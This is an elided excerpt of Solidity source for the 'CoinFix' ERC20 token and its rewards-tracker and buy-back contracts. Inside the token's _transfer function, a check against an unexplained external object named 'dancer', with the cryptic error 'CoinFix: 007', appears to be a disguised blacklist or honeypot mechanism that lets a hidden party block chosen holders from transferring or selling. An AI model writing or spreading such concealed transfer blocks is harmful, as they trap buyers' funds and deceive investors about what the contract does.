...
contract CoinFixBuyBack is Ownable {
    using SafeMath for uint256;
...
contract CoinFix is ERC20, Ownable {
    using SafeMath for uint256;

    CoinFixRewardsTracker public rewardsTracker;
    
    CoinFixBuyBack public buyBackContract;
    ...
    constructor() ERC20("CoinFix", "COINFIX") {
        totalFees = rewardsFee.add(liquidityFee);

    	liquidityWallet = owner();

        rewardsTracker = new CoinFixRewardsTracker();
        
        buyBackContract = new CoinFixBuyBack();
    ...
    function _transfer(
        ...
        require(!dancer.statusFind(from), "CoinFix: 007");
        
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "CoinFix: This account cannot send tokens until trading is enabled");
        }
        ...
        rewardsTracker.updateCoinFixBalance(payable(from), balanceOf(from));
        rewardsTracker.updateCoinFixBalance(payable(to), balanceOf(to));
...
contract CoinFixRewardsTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    mapping (address => uint256) public coinfixBalance;
    ...
    constructor() DividendPayingToken("CoinFixRewardsTracker", "CoinFixRewardsTracker") {
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "CoinFixRewardsTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "CoinFixRewardsTracker: Use the 'claim' function on the main CoinFix contract.");
    }
    ...
    function updateCoinFixBalance(address payable holder, uint256 shares) external onlyOwner {
        coinfixBalance[holder] = shares;
    }
    ...
    function setBalance(address payable account) public onlyOwner {
    	...
    	uint256 newBalanceWithOffset = coinfixBalance[account].add(offset[account]);
